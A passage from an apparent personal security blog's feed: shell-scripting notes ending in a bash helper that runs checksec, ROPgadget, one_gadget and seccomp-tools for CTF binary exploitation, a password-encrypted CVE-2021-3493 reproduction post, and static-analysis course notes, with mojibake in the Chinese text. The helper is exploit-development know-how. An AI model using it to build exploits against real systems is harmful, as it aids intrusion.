style="text-align:left">‰∏é$*Áõ∏ÂêåÔºå‰ΩÜÊòØ‰ΩøÁî®Êó∂Âä†ÂºïÂè∑ÔºåÂπ∂Âú®ÂºïÂè∑‰∏≠ËøîÂõûÊØè‰∏™ÂèÇÊï∞„ÄÇ</td></tr><tr><td style="text-align:left">$-</td><td style="text-align:left">ÊòæÁ§∫Shell‰ΩøÁî®ÁöÑÂΩìÂâçÈÄâÈ°πÔºå‰∏ésetÂëΩ‰ª§ÂäüËÉΩÁõ∏Âêå„ÄÇ</td></tr><tr><td style="text-align:left">$?</td><td style="text-align:left">ÊòæÁ§∫ÊúÄÂêéÂëΩ‰ª§ÁöÑÈÄÄÂá∫Áä∂ÊÄÅ„ÄÇ0Ë°®Á§∫Ê≤°ÊúâÈîôËØØÔºåÂÖ∂‰ªñ‰ªª‰ΩïÂÄºË°®ÊòéÊúâÈîôËØØ„ÄÇ</td></tr></tbody></table></div><h1 id="0x08-Êñá‰ª∂ÂåÖÂê´"><a href="#0x08-Êñá‰ª∂ÂåÖÂê´" class="headerlink" title="0x08 Êñá‰ª∂ÂåÖÂê´"></a>0x08 Êñá‰ª∂ÂåÖÂê´</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;demo.sh</span><br><span class="line">source .&#x2F;demo.sh</span><br></pre></td></tr></table></figure><h1 id="0x09-A-demo"><a href="#0x09-A-demo" class="headerlink" title="0x09 A demo"></a>0x09 A demo</h1><p>Êï¥ÂêàPWNÂ∑•ÂÖ∑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#30-37 to highlight</span></span><br><span class="line"><span class="comment">#help</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;31m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] Welcome Pwner!'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] -ROP to search some gadgets. '</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] -One to search onegadget'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] -secc to check sandbox'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] example:ch filename [-ROP "pop|ret"] [-One] [-secc]'</span></span><br><span class="line"></span><br><span class="line">file=<span class="variable">$1</span></span><br><span class="line"><span class="comment">#check file exist</span></span><br><span class="line"><span class="keyword">if</span> [[ -z <span class="variable">$&#123;file&#125;</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;32m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"You should give a file name"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#file and checksec </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;32m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] This is the file information:'</span></span><br><span class="line">file <span class="variable">$&#123;file&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;33m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[+] The is the security:'</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -x <span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">`chmod +x <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line">`checksec <span class="variable">$&#123;file&#125;</span>`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROPgadget and one_gadget and seccomp</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;36m"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Some information:"</span></span><br><span class="line"><span class="keyword">for</span> argv <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$&#123;argv&#125;</span> = <span class="string">"-ROP"</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">ROPgadget --binary <span class="variable">$&#123;file&#125;</span> --only <span class="string">"<span class="variable">$3</span>"</span></span><br><span class="line"><span class="keyword">elif</span> [[ <span class="variable">$&#123;argv&#125;</span> = <span class="string">"-One"</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">one_gadget <span class="variable">$&#123;file&#125;</span> -l2</span><br><span class="line"><span class="keyword">elif</span> [[ <span class="variable">$&#123;argv&#125;</span> = <span class="string">"-secc"</span> ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">seccomp-tools dump ./<span class="variable">$&#123;file&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;shellÊòØ‰∏™Â•Ω‰∏úË•ø&lt;/p&gt;</summary>
    
    
    
    
    <category term="others" scheme="https://pz1o.top/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3493Â§çÁé∞</title>
    <link href="https://pz1o.top/2021/05/03/CVE-2021-3493%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2021/05/03/CVE-2021-3493%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-03T11:36:49.000Z</published>
    <updated>2021-06-03T09:29:57.389Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="CVEÂ§çÁé∞" scheme="https://pz1o.top/tags/CVE%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>static program</title>
    <link href="https://pz1o.top/2021/05/03/static-program/"/>
    <id>https://pz1o.top/2021/05/03/static-program/</id>
    <published>2021-05-03T08:16:11.000Z</published>
    <updated>2021-06-09T11:46:15.299Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-Static-Program-Analysis"><a href="#0x01-Static-Program-Analysis" class="headerlink" title="0x01 Static Program Analysis"></a>0x01 Static Program Analysis</h1><a id="more"></a><h2 id="1-introduction"><a href="#1-introduction" class="headerlink" title="1.introduction"></a>1.introduction</h2><p><img src="/2021/05/03/static-program/image-20210315224533888.png" alt="image-20210315224533888"></p><h2 id="2-sound-and-complete"><a href="#2-sound-and-complete" class="headerlink" title="2.sound and complete"></a>2.sound and complete</h2><p><img src="/2021/05/03/static-program/image-20210315231054502.png" alt="image-20210315231054502"></p><p><img src="/2021/05/03/static-program/image-20210315231536756.png" alt="image-20210315231536756"></p><h2 id="3-what-is-static-analysis"><a href="#3-what-is-static-analysis" class="headerlink" title="3.what is static analysis"></a>3.what is static analysis</h2><p>a view as this draw</p><p><img src="/2021/05/03/static-program/image-20210316000124963.png" alt="image-20210316000124963"></p><h2 id="4-abstraction-and-overapproximation"><a href="#4-abstraction-and-overapproximation" class="headerlink" title="4.abstraction and overapproximation"></a>4.abstraction and overapproximation</h2><p>first,abstraction</p><p><img src="/2021/05/03/static-program/image-20210316000642671.png" alt="image-20210316000642671"></p><p>next,transfer function</p><p><img src="/2021/05/03/static-program/image-20210316001346346.png" alt="image-20210316001346346"></p><p>it is similar to Symbolic execution</p><p><img src="/2021/05/03/static-program/image-20210316001430168.png" alt="image-20210316001430168"></p><p>last control flow.</p><p><img src="/2021/05/03/static-program/image-20210316001748641.png" alt="image-20210316001748641"></p><h1 id="0x02-Intermediate-Representation"><a href="#0x02-Intermediate-Representation" class="headerlink" title="0x02 Intermediate Representation"></a>0x02 Intermediate Representation</h1><h2 id="1-Compiler"><a href="#1-Compiler" class="headerlink" title="1.Compiler"></a>1.Compiler</h2><p><img src="/2021/05/03/static-program/image-20210316010120880.png" alt="image-20210316010120880"></p><h2 id="2-AST-vs-IR"><a href="#2-AST-vs-IR" class="headerlink" title="2.AST vs IR"></a>2.AST vs IR</h2><p><img src="/2021/05/03/static-program/image-20210316010715717.png" alt="image-20210316010715717"></p><h2 id="3-3-Address-Code"><a href="#3-3-Address-Code" class="headerlink" title="3.3-Address Code"></a>3.3-Address Code</h2><p><img src="/2021/05/03/static-program/image-20210316010948812.png" alt="image-20210316010948812"></p><p><strong>Forms</strong></p><p><img src="/2021/05/03/static-program/image-20210316012707595.png" alt="image-20210316012707595"></p><h2 id="4-Soot-‚Äòs-‚ÄòJimple"><a href="#4-Soot-‚Äòs-‚ÄòJimple" class="headerlink" title="4.Soot ‚Äòs ‚ÄòJimple"></a>4.Soot ‚Äòs ‚ÄòJimple</h2><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForLoop3AC</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">x = x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316012632094.png" alt="image-20210316012632094"></p><h3 id="do‚Ä¶while"><a href="#do‚Ä¶while" class="headerlink" title="do‚Ä¶while"></a>do‚Ä¶while</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWhileLoop3AC</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">i = i+<span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(arr[i]&lt;<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316013150012.png" alt="image-20210316013150012"></p><blockquote><p>$‰ª£Ë°®‰∏¥Êó∂ÂèòÈáè</p></blockquote><h3 id="method-call"><a href="#method-call" class="headerlink" title="method call"></a>method call</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MethodCall3AC</span></span>&#123;</span><br><span class="line"><span class="function">String <span class="title">foo</span><span class="params">(String para1, String para2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> para1 + <span class="string">" "</span> + para2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">MethodCall3AC mc = <span class="keyword">new</span> MethodCall3AC();</span><br><span class="line">    String result = mc.foo(<span class="string">"hello"</span>,<span class="string">"world"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>method signature</code>:class name/return type/method name(parameter1 type,parameter2 type‚Ä¶)</p><p><img src="/2021/05/03/static-program/image-20210316125222155.png" alt="image-20210316125222155"></p></blockquote><p><img src="/2021/05/03/static-program/image-20210316124211598.png" alt="image-20210316124211598"></p><p><img src="/2021/05/03/static-program/image-20210316124243765.png" alt="image-20210316124243765"></p><h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Class3AC</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> pi = <span class="number">3.14</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210316125913305.png" alt="image-20210316125913305"></p><h2 id="5-SSA-Static-Single-Assignment"><a href="#5-SSA-Static-Single-Assignment" class="headerlink" title="5.SSA(Static Single Assignment)"></a>5.SSA(Static Single Assignment)</h2><p>Every variable has exactly one definition</p><p>function to deal with two or many variables</p><p><img src="/2021/05/03/static-program/image-20210316130354246.png" alt="image-20210316130354246"></p><h2 id="6-Control-Flow-Graph"><a href="#6-Control-Flow-Graph" class="headerlink" title="6.Control Flow Graph"></a>6.Control Flow Graph</h2><p>Nodes:BBs</p><p>Edge</p><p><img src="/2021/05/03/static-program/image-20210316130826596.png" alt="image-20210316130826596"></p><h3 id="Basic-Block"><a href="#Basic-Block" class="headerlink" title="Basic Block"></a>Basic Block</h3><p><strong>definition</strong></p><ol><li>It can be entered only at the beginning.</li><li>It can be exited only at the end</li><li>It should be a maximal.</li></ol><p><strong>how to build it</strong></p><p>determine leader </p><p><img src="/2021/05/03/static-program/image-20210316131723881.png" alt="image-20210316131723881"></p><p>eg:</p><p>Ëøô‰∏™‰æãÂ≠êÂ§™ÂΩ¢Ë±°‰∫ÜÔºå‰∏çÂæó‰∏çÁî®‰∏≠ÊñáËØ¥‰∏Ä‰∏ã</p><ol><li>first,determine leader(first instruction/jump target/follow jump)</li><li>build BBs</li></ol><p><img src="/2021/05/03/static-program/image-20210316132039750.png" alt="image-20210316132039750"></p><h3 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h3><p><strong>how to</strong></p><p>There are two cases</p><p><img src="/2021/05/03/static-program/image-20210316132843680.png" alt="image-20210316132843680"></p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p><img src="/2021/05/03/static-program/image-20210316133326936.png" alt="image-20210316133326936"></p><h1 id="0x03Data-Flow-Analysis-Applications"><a href="#0x03Data-Flow-Analysis-Applications" class="headerlink" title="0x03Data Flow Analysis-Applications"></a>0x03Data Flow Analysis-Applications</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1.Overview"></a>1.Overview</h2><p><img src="/2021/05/03/static-program/image-20210316162556579.png" alt="image-20210316162556579"></p><p><img src="/2021/05/03/static-program/image-20210316163402058.png" alt="image-20210316163402058"></p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><ul><li>forward</li><li>backward</li></ul><p><img src="/2021/05/03/static-program/image-20210316164525008.png" alt="image-20210316164525008"></p><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p><img src="/2021/05/03/static-program/image-20210316165009528.png" alt="image-20210316165009528"></p><h2 id="2-Reaching-Definitions-Analysis"><a href="#2-Reaching-Definitions-Analysis" class="headerlink" title="2. Reaching Definitions Analysis"></a>2. Reaching Definitions Analysis</h2><h3 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210316165640682.png" alt="image-20210316165640682"></p><h3 id="understanding"><a href="#understanding" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on definition</p><p>transfer Function</p><ul><li>generate a definition</li><li>kill other definition</li></ul><p>control flow</p><p><img src="/2021/05/03/static-program/image-20210316171733031.png" alt="image-20210316171733031"></p><p><strong>eg</strong></p><p><img src="/2021/05/03/static-program/image-20210316172331897.png" alt="image-20210316172331897"></p><h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><p>ËøôÈáåÊúâ‰∏§‰∏™ÁÇπÈúÄË¶ÅÁúã‰∏Ä‰∏ã</p><ol><li>‰∏∫‰ªÄ‰πàOUT[entry]=Á©∫ÔºüÂõ†‰∏∫ÂÖ•Âè£Â§ÑÂπ∂Êú™ÂÆö‰πâ„ÄÇÊ≠§Â§ñÔºå‰∏∫‰ªÄ‰πà‰∏çÊääOUT[entry]ÊîæÂÖ•forÂæ™ÁéØ‰∏≠ÔºüÂõ†‰∏∫Ë¶ÅÊúâ‰∏Ä‰∏™Ê®°ÊùøÁîüÊàêÁÆóÊ≥ï</li><li>‰∏ãÈù¢Ëøô‰∏™while‰∏≠forÂæ™ÁéØÁöÑÂÅúÊ≠¢Êù°‰ª∂Âú®Âì™ÈáåÔºü</li></ol><p><img src="/2021/05/03/static-program/image-20210316172851109.png" alt="image-20210316172851109"></p><p><strong>eg</strong></p><p>how  CFG transfer to SourceCodeÔºü</p><p><img src="/2021/05/03/static-program/image-20210316173536011.png" alt="image-20210316173536011"></p><p>next,we will see the changes on the OUT[].</p><p>we should focus on two points</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IN[B] &#x3D; union(p a predecessor of B OUT[P]);</span><br><span class="line">OUT[B] &#x3D; genB(IN[B]-killB);</span><br></pre></td></tr></table></figure><p>until no changes occur on OUT</p><p><img src="/2021/05/03/static-program/image-20210316223814163.png" alt="image-20210316223814163"></p><p>There are two sentences.</p><p>This is very important</p><p>In each data-flow analysis application, we associate with every program point a <strong>data-flow value</strong> that represents an <strong>abstraction</strong> of the set of all possible <strong>program states</strong> that can be observed for the point.</p><p>Data-flow analysis is to <strong>find a solution</strong> to a set of <strong>safe-approximation</strong> directed constraints on the IN‚Äôs and OUT‚Äôs,for all statements.</p><p>And why this algorithm can stop?</p><p><img src="/2021/05/03/static-program/image-20210316225904275.png" alt="image-20210316225904275"></p><h2 id="3-Live-Variables-Analysis"><a href="#3-Live-Variables-Analysis" class="headerlink" title="3. Live Variables Analysis"></a>3. Live Variables Analysis</h2><h3 id="definition-1"><a href="#definition-1" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210316230830828.png" alt="image-20210316230830828"></p><h3 id="understanding-1"><a href="#understanding-1" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on variables</p><p><img src="/2021/05/03/static-program/image-20210316231409321.png" alt="image-20210316231409321"></p><p><img src="/2021/05/03/static-program/image-20210317170644795.png" alt="image-20210317170644795"></p><h3 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h3><p><img src="/2021/05/03/static-program/image-20210317171158537.png" alt="image-20210317171158537"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IN[B] &#x3D; useB union (OUT[B]-defB)</span><br><span class="line">OUT[B] &#x3D; union s a successor of B IN[S]</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210317173026174.png" alt="image-20210317173026174"></p><h2 id="4-Available-Expressions-Analysis"><a href="#4-Available-Expressions-Analysis" class="headerlink" title="4. Available Expressions Analysis"></a>4. Available Expressions Analysis</h2><h3 id="definition-2"><a href="#definition-2" class="headerlink" title="definition"></a>definition</h3><p><img src="/2021/05/03/static-program/image-20210317173623458.png" alt="image-20210317173623458"></p><h3 id="understanding-2"><a href="#understanding-2" class="headerlink" title="understanding"></a>understanding</h3><p>Focus on expressions</p><p><img src="/2021/05/03/static-program/image-20210317174047841.png" alt="image-20210317174047841"></p><p><img src="/2021/05/03/static-program/image-20210317175430257.png" alt="image-20210317175430257"></p><h3 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OUT[B] &#x3D; genB union (IN[B]-killB)</span><br><span class="line">IN[B] &#x3D; ‰∫§ P a predecessor of B OUT[P]</span><br></pre></td></tr></table></figure><p><img src="/2021/05/03/static-program/image-20210317194602113.png" alt="image-20210317194602113"></p><h2 id="5-Analysis-Comparison"><a href="#5-Analysis-Comparison" class="headerlink" title="5. Analysis Comparison"></a>5. Analysis Comparison</h2><p><img src="/2021/05/03/static-program/image-20210317195618231.png" alt="image-20210317195618231"></p><h1 id="0x04-Data-Flow-Analysis-Foundations"><a href="#0x04-Data-Flow-Analysis-Foundations" class="headerlink" title="0x04 Data-Flow-Analysis Foundations"></a>0x04 Data-Flow-Analysis Foundations</h1><h2 id="1-Iterative-Algorithm"><a href="#1-Iterative-Algorithm" class="headerlink" title="1. Iterative Algorithm"></a>1. Iterative Algorithm</h2><p><strong>why</strong></p><p>This has a fixed point.</p><p><img src="/2021/05/03/static-program/image-20210317202238222.png" alt="image-20210317202238222"></p><h2 id="2-Partial-Order"><a href="#2-Partial-Order" class="headerlink" title="2. Partial Order"></a>2. Partial Order</h2><h2 id="3-Lattice"><a href="#3-Lattice" class="headerlink" title="3. 